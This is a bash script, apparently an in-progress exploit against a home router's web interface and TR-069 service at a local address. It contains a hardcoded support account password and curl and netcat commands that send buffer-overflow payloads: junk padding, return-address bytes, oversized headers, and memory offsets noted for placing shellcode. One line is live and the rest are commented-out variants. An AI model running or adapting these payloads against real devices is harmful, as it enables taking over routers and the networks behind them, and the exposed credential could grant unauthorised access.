#!/bin/bash
# support:theworldinyourhand
# curl 'http://192.168.1.242/Forms/tools_test_1' \
#   -H 'Authorization: Basic c3VwcG9ydDp0aGV3b3JsZGlueW91cmhhbmQ=' \
#   --data-raw 'Test_PVC=0%0D%0A&PingIPAddr=asdf.local&pingflag=1&trace_open_flag=0&InfoDisplay=%00XInfo+-%0D%0A'
#   
# curl -s http://192.168.1.242/maintenance/tools_test.htm \
#   -H 'Authorization: Basic c3VwcG9ydDp0aGV3b3JsZGlueW91cmhhbmQ=' \
#   | tail -n +103 | head -n -9

junk(){ for i in {1..580}; do echo -n "$1"; done; }
junk46(){ for i in {1..46}; do echo -n "$1"; done; }
junk2000(){ for i in {1..4000}; do echo -en "$1"; done; }
nop(){ for i in {1..128}; do echo -n '0'; done; }
# curl -vH "Authorization: Digest username=$(cat pattern.txt)" \
#   -H "Content-Length: 999999999999999999999999999" \
#   --data-raw "$(printf '\x00\x00\x00\x00\x24\x0d\x00\x0c\x0b\xf0\xff\xff"' '%b')" \
#   192.168.1.242:7547/tr069

# Place shell Code
# curl -vH "Authorization: Digest username=hello" \
#   --data-binary @pattern.txt \
#   192.168.1.242:7547/tr069
# nc -w 2 -C 192.168.1.242 7547
# auth header line: 80499830
# username: 8053F6E0
# body?: 804988B1 offset 122 (replaced by response body)
echo -en "XXX / HTTP/1.1
Authorization: Digest username=$(junk X)\x
Content-Length: 12
\x00\x00\x00\x00\x00\x00\x00\x0c\x0b\xf0\xff\xff" | nc -w 2 -C 192.168.1.242 80
 
# curl -vH "Authorization: Digest username=$(junk X)$(printf '\x03\xe0\x00\x08' '%b')" \
#   192.168.1.242:7547/tr069

# Must logged in Offset in 46
# curl 'http://192.168.1.242/Forms/tools_test_1' \
#   -vH 'Authorization: Basic c3VwcG9ydDp0aGV3b3JsZGlueW91cmhhbmQ=' \
#   --data-raw "Test_PVC=PVC0&PingIPAddr=$(junk46 X)$(printf '\x80\x6D\x2F\x8f' '%b')&pingflag=1&trace_open_flag=0&InfoDisplay=$(junk2000 a)"


  # --data-raw "$(junk2000 A)" \
# curl -v \
#   -H "Content-Length: 1" \
#   -H "Authentication: Basic $(junk2000 x | base64)" \
#   192.168.1.242/